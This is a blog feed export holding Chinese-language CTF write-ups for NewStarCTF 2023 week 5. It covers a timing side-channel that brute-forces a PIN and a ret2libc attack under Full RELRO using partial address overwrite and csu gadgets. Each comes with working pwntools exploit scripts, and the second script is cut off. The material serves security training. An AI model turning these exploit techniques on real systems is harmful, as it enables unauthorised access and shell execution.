{
    "version": "https://jsonfeed.org/version/1",
    "title": "Walt's Blog • All posts by \"时间差\" tag",
    "description": "",
    "home_page_url": "http://waltcsz.github.io",
    "items": [
        {
            "id": "http://waltcsz.github.io/PWN/Write-Up/newstarctf2023-week5-bf2485f15add/",
            "url": "http://waltcsz.github.io/PWN/Write-Up/newstarctf2023-week5-bf2485f15add/",
            "title": "newstarctf2023 week5",
            "date_published": "2023-10-23T06:07:01.000Z",
            "content_html": "<h1 id=\"newstarctf2023-week5\"><a class=\"markdownIt-Anchor\" href=\"#newstarctf2023-week5\">#</a> newstarctf2023 week5</h1>\n<h2 id=\"login\"><a class=\"markdownIt-Anchor\" href=\"#login\">#</a> login</h2>\n<p>brop 侧信道攻击</p>\n<p>存在栈溢出，但是有 canary。</p>\n<p>输入时可以用空格等空字符分隔输入，所以输入函数用的是 scanf，scanf 会在输入字符串后面自动添加 <code>'\\0'</code> ，所以无法爆破 canary。于是也没办法用栈溢出了。</p>\n<blockquote>\n<p>考虑过通过大量溢出覆盖栈高处的 TLS（Thread Local Storage）存储的 canary 值，但是好像先因为 scanf 输入字符过多崩溃了</p>\n</blockquote>\n<p>经 Lxxxt 爷指点，发现这道题是 2023 年全国信息安全大赛原题改编。要用的是侧信道攻击法，利用程序判断密码（或 PIN 码）正确与否的时间差来推测正确的密码（或 PIN）码。</p>\n<h3 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理</h3>\n<p>程序有 3 个功能：</p>\n<ol>\n<li>输入密码登陆系统</li>\n<li>注册账号，但是该功能是没用的。</li>\n<li>重置密码，输入 PIN6 位验证码。</li>\n</ol>\n<p>其中输入密码和输入 PIN 码都是使用字符串输入，而如果程序使用的判断正确与否的逻辑是，“若第 i 位不正确，直接跳出，否则继续判断 i+1 位”，那么，在前 i-1 位正确的情况下，第 i 位为错误返回的时间应该比第 i 位为正确返回的时间快。利用这段时间可以 “逐位” 爆破密码。</p>\n<p>因为 PIN 确定一定为 6 位数字，所以从爆破 PIN 入手。前提还有 PIN 码每次调用重置密码功能时不会重置。</p>\n<p>利用脚本爆破。</p>\n<h3 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程</h3>\n<p>6 位 PIN 码，从第一位开始 0~9 测试，后面 5 位直接置 0。每次输入时记下开始时间，收到内容后记下结束时间，算出时间差。为减小因网络因素等产生的误差，每个数字测试 10 次取平均值，平均时间差最长的即为该位正确值。由此类推继续爆破后面 5 位。</p>\n<p>如果中途返回的字符串不含 <code>&quot;Wrong code!&quot;</code> ，则说明已经爆破到正确的 PIN 码了。此时跳出爆破循环进入后续操作。</p>\n<p>输入正确的 PIN 码后，获得修改密码的机会。修改密码后在登陆功能处输入密码，即可 getshell。</p>\n<p><img data-src=\"./image-20231031224129185.png\" alt=\"image-20231031224129185\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> sys <span class=\"token keyword\">import</span> argv</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#context.log_level='debug'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">s</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">sa</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">sl</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">sla</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">r</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">pr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">ru</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">inter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_addr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">return</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_sb</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">return</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> libc_base <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getpin</span><span class=\"token punctuation\">(</span>pin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\tsubtime <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tres <span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\tpin_o <span class=\"token operator\">=</span> pin<span class=\"token operator\">+</span>c<span class=\"token operator\">+</span><span class=\"token string\">'0'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>pin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t<span class=\"token builtin\">sum</span><span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">b'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t\tru<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Input code:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t\tstart<span class=\"token operator\">=</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t\tsl<span class=\"token punctuation\">(</span>pin_o<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t\trev<span class=\"token operator\">=</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">19</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token string\">b\"Wrong code!\"</span> <span class=\"token keyword\">in</span> rev<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>pin_o<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t\t\t\tp<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\t\tend<span class=\"token operator\">=</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t\t<span class=\"token builtin\">sum</span><span class=\"token operator\">+=</span><span class=\"token punctuation\">(</span>end<span class=\"token operator\">-</span>start<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>pin_o<span class=\"token punctuation\">,</span><span class=\"token builtin\">sum</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t\tavgtime<span class=\"token operator\">=</span><span class=\"token builtin\">sum</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>avgtime<span class=\"token operator\">></span>subtime<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t\t\tsubtime<span class=\"token operator\">=</span>avgtime</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t\t\tres<span class=\"token operator\">=</span>c</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t<span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>a<span class=\"token operator\">=</span><span class=\"token string\">'0123456789'</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>p<span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node4.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">27984</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>pin<span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\tpin<span class=\"token operator\">+=</span>getpin<span class=\"token punctuation\">(</span>pin<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PIN:\"</span><span class=\"token punctuation\">,</span>pin<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token comment\">#后面没用了 懒得写跳转</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">b\"123456\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"no_ouput\"><a class=\"markdownIt-Anchor\" href=\"#no_ouput\">#</a> no_ouput</h2>\n<p>full_RELRO ret2libc</p>\n<p>这道题开了 Full RELRO 保护，got 表一开始就已经填完并且只读了。但是没有开 PIE，要利用程序本身已有的代码还是很方便的。</p>\n<p><img data-src=\"./image-20231031224624377.png\" alt=\"image-20231031224624377\"></p>\n<p>同时，程序没有输出函数，got 表只有 read 和 setvbuf。主程序中 read 函数可以进行栈溢出。</p>\n<img data-src=\"./image-20231031224856598.png\" alt=\"image-20231031224856598\" style=\"zoom:50%;\" />\n<img data-src=\"./image-20231031224746063.png\" alt=\"image-20231031224746063\" style=\"zoom: 67%;\" />\n<h3 id=\"漏洞\"><a class=\"markdownIt-Anchor\" href=\"#漏洞\">#</a> 漏洞</h3>\n<p>主函数在执行 read 函数后，将 read 函数的真实地址赋给了名为 a 的全局变量。这时候，虽然没有输出函数，但因为 write 函数和 read 函数在 libc 中相邻很近，我们便可以通过只修改 a 的最低两位，然后跳到 write 函数，利用其泄露 libc 地址。</p>\n<img data-src=\"./image-20231031224806243.png\" alt=\"image-20231031224806243\" style=\"zoom:50%;\" />\n<img data-src=\"./image-20231031224829366.png\" alt=\"image-20231031224829366\" style=\"zoom:50%;\" />\n<h3 id=\"利用\"><a class=\"markdownIt-Anchor\" href=\"#利用\">#</a> 利用</h3>\n<p>首先栈溢出，返回到 read 函数，设置写入位置为 a 的地址。真实地址低 3 位固定，第 4 位随机，所以需要爆破。</p>\n<p>随后利用 csu 调用 a 处储存的地址，以及配置相关参数。这里便是调用 write 函数，输出的内容为 a，即为 write 的真实地址，然后返回 main 函数。</p>\n<p>利用 write 地址算出 system 地址和 <code>&quot;/bin/sh&quot;</code>  地址，再次溢出，getshell。</p>\n<p><img data-src=\"./image-20231031230042309.png\" alt=\"image-20231031230042309\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.31.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'/glibc-all-in-one/2.31-0ubuntu9.7_amd64/libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn_pe'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>write_la <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x070</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>read_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>prdi <span class=\"token operator\">=</span> <span class=\"token number\">0x0401253</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>rsi_r15 <span class=\"token operator\">=</span> <span class=\"token number\">0x401251</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x040101a</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x404050</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>csu_front_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x0401230</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>csu_end_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x040124a</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">csu</span><span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">,</span> rbp<span class=\"token punctuation\">,</span> r12<span class=\"token punctuation\">,</span> r13<span class=\"token punctuation\">,</span> r14<span class=\"token punctuation\">,</span> r15<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token comment\"># pop rbx,rbp,r12,r13,r14,r15</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token comment\"># rbx should be 0,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token comment\"># rbp should be 1,enable not to jump</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token comment\"># r15 should be the function we want to call</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token comment\"># rdi=edi=r12d</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token comment\"># rsi=r13</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token comment\"># rdx=r14</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>csu_end_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rbp<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>r12<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>r13<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>r14<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>csu_front_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    payload <span class=\"token operator\">+=</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x38</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">return</span> payload</pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>by<span class=\"token operator\">=</span><span class=\"token number\">0</span> </pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>by<span class=\"token operator\">&lt;</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26547</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn_pe'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    payload <span class=\"token operator\">=</span> offset <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rsi_r15<span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>read_p<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    payload <span class=\"token operator\">+=</span> csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>target<span class=\"token punctuation\">,</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span>target<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'pause'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.02</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        payload <span class=\"token operator\">=</span> p8<span class=\"token punctuation\">(</span>write_la<span class=\"token operator\">&amp;</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span>by<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        write_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token 